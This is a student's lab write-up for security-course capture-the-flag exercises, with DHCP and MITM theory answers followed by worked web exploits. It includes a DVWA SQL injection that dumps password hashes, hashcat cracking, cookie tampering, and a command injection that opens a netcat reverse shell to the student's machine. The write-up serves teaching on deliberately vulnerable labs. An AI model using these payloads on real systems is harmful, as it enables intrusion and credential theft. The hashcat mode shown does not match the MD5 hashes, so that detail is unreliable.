

> [!exercise]+ Exercise 1 - DHCP Attack
>
> Another type of attack that was not included in the workshop is DHCP (dynamic host configuration protocol) based attacks. Do a bit of research into how DHCP works and about some DHCP attacks and answer the following questions.
>
> 1. What are the 4 packets (messages) that are communicated between the client seeking and IP address and the DHCP server?
>
> 2. Are the 4 messages Layer 2 unicast or broadcast (be careful not to confuse between Layer 3 broadcast, which is sending to an IP broadcast address like 10.0.2.255, as opposed to Layer 2 broadcast which is sent to MAC address FF:FF:FF:FF:FF:FF).
>
> 3. Therefore, in a switched network, which of the 4 messages in the DHCP negotiation would the attacker be able to observe?
>
> 4. Briefly explain what DHCP spoofing and DHCP starvation attacks are executed, and how the two can be used in combination. 
>
> 5. For an adversary looking to perform MITM, which DHCP configuration option(s) would you try to manipulate?
>
> 6. Briefly explain how "DHCP **snooping**" configuration in a switch work to prevent DHCP **spoofing**?
>
> **Answers:**
>
> 1. The 4 packets communicated between the client and DHCP server are **DISCOVERY, OFFER, REQUEST and ACKNOWLEDGE**. These messages enable the client to obtain an IP address from the server.
>
> 2. DISCOVERY and REQUEST packets are sent as Layer 2 broadcasts because the requesting client does not have an IP address yet. OFFER and ACKNOWLEDGE packets are sent as Layer 2 unicasts because the DHCP server knows the client's MAC address and can respond directly.
>
> 3. In a switched network, an attacker would be able to observe the broadcast DISCOVERY and REQUEST messages on all switch ports. However, the attacker would not see the unicast OFFER and ACKNOWLEDGE packets exchanged directly between the server and client.
>
> 4. DHCP spoofing involves setting up a fake DHCP server to hand out incorrect IP configurations to clients. DHCP starvation overwhelms the real DHCP server by flooding it with many requests, depleting the available IP address pool. Used together, these attacks can prevent the real DHCP server from providing service and allow the attacker to give clients malicious network settings.
>
> 5. To execute a MITM attack, an adversary would likely try to manipulate the DNS server and default gateway settings provided by DHCP. By controlling DNS resolution and routing, the attacker can redirect and intercept the victim's traffic.
>
> 6. DHCP snooping is a feature configured on switches to combat DHCP spoofing attacks. The switch identifies which physical ports are allowed to send DHCP server messages (OFFER and ACKNOWLEDGE) and which are only permitted client messages. This stops rogue DHCP servers on untrusted ports from handing out fake DHCP information. The switch tracks legitimate DHCP-assigned addresses in a binding table.


> [!exercise]+ Exercise 2 - MITM Prevention
> 1. Briefly explain (1 or 2 sentences max) how HTTPS can defeat MITM via ARP cache poisoning.
> 2. In the same context, why did Chrome developers decided to display "Not Secure" on HTTP websites?
> 3. In the same context, what's the danger of ignoring a browser error message like this one and clicking on "Continue to this website"?
> 4. Briefly write an explanation that you might provide to your grandparent (or anyone who may not be IT savvy) why they should be careful when connecting to open WiFi hotspots like the ones at airports.



> [!exercise]+ Exercise 3 
> Go to `http://<Your Hacklab VM IP addr>:8081/method.php` to get the secret!
> 
> **Answer:**
> Initially, I tried visiting the site in my browser but only received a hint: `"Hm... you don't seem to be using the correct METHOD. Explore your available OPTIONS."` This made it clear that I should attempt an `OPTIONS` request via `curl`.
> 
> ```bash
> curl -X OPTIONS http://192.168.56.113:8081/method.php
> ```
> 
> This returned the flag:
> ```
> csf2021_{helper-evaluate-mammogram}
>```


> [!exercise]+ Exercise 4
> Access `http://192.168.56.113:8081/admin.php` to get the secret!
> 
> **Answer:**
> I visited the page and clicked on the request button, which revealed the hint: `"Sorry, only superadmins are allowed to see the secret."` This led me to inspect the cookies via the browser’s developer tools.
> 
> I adjusted the `superuser` cookie to `true` and clicked on the request button again:
> 
> ```
> Welcome Super User! Here is the secret: csf2021_{client-postbox-amid}
> ```
> 
> ![[Pasted image 20240502052455.png]]


> [!exercise]+ Exercise 5
> When on the high-security setting of DVWA, go to the SQL injection section and attempt to exploit the vulnerability. A helpful hint is to examine the source code present on the page. Retrieve the hash associated with the user ‘1337’ and also convert the hash to its plaintext form. Explain the process of exploiting the vulnerability, identify the type of hash obtained, and describe the method used to convert the hash to plaintext.
> 
> **Answer:**
> 
> I started off by looking at the PHP source code of the SQL Injection page. I noticed that the query was directly incorporating user inputs via session variables into an SQL command. This configuration was particularly vulnerable to SQL injection ... especially if those session variables could be altered!
> 
> ```
> a' UNION SELECT user, password FROM users -- -&Submit=Submit
> ```
> 
> I injected into the session variable to manipulate the SQL query. This injection effectively combined a falsified SQL command with the original, intended to pull user names and passwords directly from the database.
> 
> ```
> ID: ID: a' UNION SELECT user, password FROM users -- -&Submit=Submitit=Submit  
First name: admin  
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
>
>ID: ID: a' UNION SELECT user, password FROM users -- -&Submit=Submitit=Submit  
>First name: gordonb  
>Surname: e99a18c428cb38d5f260853678922e03
>
>ID: ID: a' UNION SELECT user, password FROM users -- -&Submit=Submitit=Submit  
>First name: 1337  
>Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
>
>ID: ID: a' UNION SELECT user, password FROM users -- -&Submit=Submitit=Submit  
>First name: pablo  
>Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
>
>ID: ID: a' UNION SELECT user, password FROM users -- -&Submit=Submitit=Submit  
>First name: smithy  
>Surname: 5f4dcc3b5aa765d61d8327deb882cf99
>```
> 
> The output displayed the hash for user ‘1337’ as `8d3533d75ae2c3966d7e0d4fcc69216b`. From workshop 8, we know that these are md5 hashes WITHOUT salts, so we can now begin decrypting it to plain text.
> 
> - I've added an excerpt from workshop 5 to verify this
> ```
> passwords here are MD5 hashes, not plaintext passwords. But you can right away tell that the password for the user admin is the same as smithy, becuase their password hashes are identical (this is why password SALT is so important, as we will learn in later workshops).
> ```
> 
> Using the same hashcat method from assignment 1 with the `rockyou.txt` dictionary, we find that the plaintext password is `charley`
> 
> ```
> hashcat -m 500 -o out hash rockyou.txt --force
> 
> ...
> 
> 8d3533d75ae2c3966d7e0d4fcc69216b:charley
> ```
> To confirm the findings, I logged back into the DVWA using the credentials `1337` and `charley`, verifying that the password matched, thereby successfully exploiting the vulnerability and decrypting the hash.
> 
> ![[Pasted image 20240502104809.png]]


> [!exercise]+ Exercise 6
> Go to `http://<Your Hacklab VM IP addr>:8083/doa.php` to get the secret!
> 
> **Answer:**
> 
> Upon navigating to the webpage and seeing user input, I suspected a possible command injection vulnerability. Before attempting to exploit the vulnerability, I set up a **netcat listener** on my local machine using:
> 
> ```
> nc -lvp 1234
> ```
> 
> After setting up the listener, I submitted the form with the injected command and awaited the connection on my local machine.
> 
> ```
> 127.0.0.1 & nc -e /bin/sh 192.168.117.124 1234
> ```
> I now have a **reverse shell!** Using `ls -a` command to list all hidden files, I found `.the_secret_file`.
> 
> I then used the `cat` command to reveal its contents:
> 
> ```
> cat .the_secret_file
> ```
> ```
> ___________________________________________
> / csf2024s1_{botchier-disquiparancy-propp \
> \ er}                                     /
>  -----------------------------------------
>         \   ^__^
>          \  (oo)\_______
>             (__)\       )\/\
>                 ||----w |
>                 ||     ||
> ```
> 

